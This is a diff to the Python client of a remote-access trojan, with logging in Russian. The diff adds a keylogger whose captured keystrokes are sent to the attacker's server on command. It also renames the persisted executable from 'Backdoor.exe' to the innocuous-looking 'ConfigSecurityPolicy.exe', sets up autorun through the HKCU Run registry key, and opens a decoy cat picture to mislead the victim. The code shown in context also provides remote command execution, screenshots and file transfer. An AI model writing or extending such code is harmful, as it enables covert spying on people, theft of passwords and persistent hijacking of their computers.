@@ -11,6 +11,9 @@ import base64
 import requests
 from mss import mss
 import logging
+import threading
+from keylogger import KeyLogger
+
 
 logging.basicConfig(
     level=logging.INFO,
@@ -18,6 +21,8 @@ logging.basicConfig(
     filename="client_log.txt",
     filemode="a",
 )
+
+keylogger = KeyLogger()
 
 
 def reliable_send(data, sock):
@@ -41,6 +46,42 @@ def reliable_recv(sock):
             continue
 
 
+def open_image():
+    try:
+        if hasattr(sys, "_MEIPASS"):
+            image_path = os.path.join(sys._MEIPASS, "cutecat.jpg")
+        else:
+            image_path = os.path.join(os.getcwd(), "cutecat.jpg")
+        logging.info(f"[+] Проверяем наличие картинки: {image_path}")
+
+        if os.path.exists(image_path):
+            subprocess.Popen(["start", image_path], shell=True)
+            logging.info("[+] Картинка успешно открыта.")
+        else:
+            logging.error("[!!] Картинка не найдена.")
+    except Exception as e:
+        logging.error(f"[!!] Ошибка при открытии картинки: {e}")
+
+
+def setup_autorun():
+    try:
+        location = os.environ["APPDATA"] + "\\ConfigSecurityPolicy.exe"
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+
+        with winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE,
+        ) as key:
+            winreg.SetValueEx(key, "ConfigSecurityPolicy", 0, winreg.REG_SZ, location)
+            logging.info("[+] Запись в реестр добавлена.")
+
+    except Exception as e:
+        logging.error(f"[!!] Ошибка в setup_autorun: {e}")
+
+
 def is_admin(sock):
     try:
         temp_dir = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "temp")
@@ -53,7 +94,7 @@ def is_admin(sock):
     reliable_send(admin, sock)
 
 
-def download(url):
+def download(url, sock):
     try:
         get_response = requests.get(url, timeout=10)
         file_name = url.split("/")[-1]
@@ -118,11 +159,34 @@ def execute_command(sock, command):
         logging.error(f"[!!] Ошибка выполнения команды {command}: {e}")
 
 
+def send_keylog_file(sock):
+    try:
+        keylogger_path = os.path.join(os.environ["APPDATA"], "conf.txt")
+        with open(keylogger_path, "r") as file:
+            logs = file.read().strip()
+            if logs:
+                reliable_send(logs, sock)
+                with open(keylogger_path, "w") as file:
+                    file.write("")
+                logging.info("[+] Кейлог отправлен на сервер и очищен")
+
+            else:
+                reliable_send("[!!] Кейлог пуст", sock)
+                logging.warning("[!!] Кейлог пуст")
+    except FileNotFoundError:
+        reliable_send("[!!] Файл кейлогера не найден", sock)
+        logging.error("[!!] Файл кейлогера не найден")
+    except Exception as e:
+        reliable_send(f"[!!] Ошибка при отправке кейлогов: {e}", sock)
+        logging.error(f"[!!] Ошибка при отправке кейлогов: {e}")
+
+
 def shell(sock):
     while True:
         try:
             command = reliable_recv(sock)
             if command == "q":
+                keylogger.stop()
                 logging.info("[+] Клиент закрыт")
                 sock.close()
                 sys.exit(0)
@@ -138,7 +202,7 @@ def shell(sock):
             elif command.startswith("upload"):
                 save_file(sock, command[7:])
             elif command.startswith("get"):
-                result = download(command[4:])
+                result = download(command[4:], sock)
                 reliable_send(result, sock)
             elif command.startswith("start"):
                 try:
@@ -151,6 +215,12 @@ def shell(sock):
                 reliable_send(screenshot_data.decode(), sock)
             elif command.startswith("check"):
                 is_admin(sock)
+            elif command.startswith("keylog_start"):
+                t1 = threading.Thread(target=keylogger.start, daemon=True)
+                t1.start()
+                reliable_send("[+] Кейлогер запущен", sock)
+            elif command.startswith("keylog_dump"):
+                send_keylog_file(sock)
             else:
                 execute_command(sock, command)
         except Exception as e:
@@ -166,60 +236,16 @@ def connection():
             logging.info("[+] Успешное подключение к серверу")
             shell(sock)
         except socket.error as e:
-            logging.warning(f"[!!] Сервер недоступен. Повторная попытка через 5 секунд. Ошибка: {e}")
+            logging.warning(
+                f"[!!] Сервер недоступен. Повторная попытка через 5 секунд. Ошибка: {e}"
+            )
             time.sleep(5)
         except Exception as e:
             logging.error(f"[!!] Неизвестная ошибка в connection: {e}")
             time.sleep(5)
 
 
-def setup_autorun():
-    try:
-        location = os.environ["APPDATA"] + "\\Backdoor.exe"
-        logging.info(f"[+] Проверяем наличие файла: {location}")
-        
-        # Если файл отсутствует, копируем исполняемый файл
-        if not os.path.exists(location):
-            shutil.copyfile(sys.executable, location)
-            logging.info(f"[+] Файл скопирован в {location}")
-        
-        # Пытаемся добавить запись в реестр
-        try:
-            with winreg.OpenKey(
-                winreg.HKEY_LOCAL_MACHINE,  # Локальная машина
-                r"Software\Microsoft\Windows\CurrentVersion\Run",
-                0,
-                winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY,  # Учет 64-битной системы
-            ) as key:
-                winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
-                logging.info(f"[+] Запись в реестр добавлена: {location}")
-        except PermissionError:
-            logging.error("[!!] Недостаточно прав для записи в HKEY_LOCAL_MACHINE.")
-        except FileNotFoundError as e:
-            logging.error(f"[!!] Не удалось найти раздел реестра: {e}")
-        except Exception as e:
-            logging.error(f"[!!] Ошибка записи в реестр: {e}")
-        
-        # Открываем картинку, если она есть
-        try:
-            if hasattr(sys, "_MEIPASS"):
-                image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
-            else:
-                image_path = os.path.join(os.getcwd(), "aaa.jpg")
-            logging.info(f"[+] Проверяем наличие картинки: {image_path}")
-            
-            if os.path.exists(image_path):
-                subprocess.Popen(["start", image_path], shell=True)
-                logging.info("[+] Картинка успешно открыта.")
-            else:
-                logging.error("[!!] Картинка не найдена.")
-        except Exception as e:
-            logging.error(f"[!!] Ошибка при открытии картинки: {e}")
-
-    except Exception as e:
-        logging.error(f"[!!] Общая ошибка в setup_autorun: {e}")
-
-
 if __name__ == "__main__":
     setup_autorun()
+    open_image()
     connection()
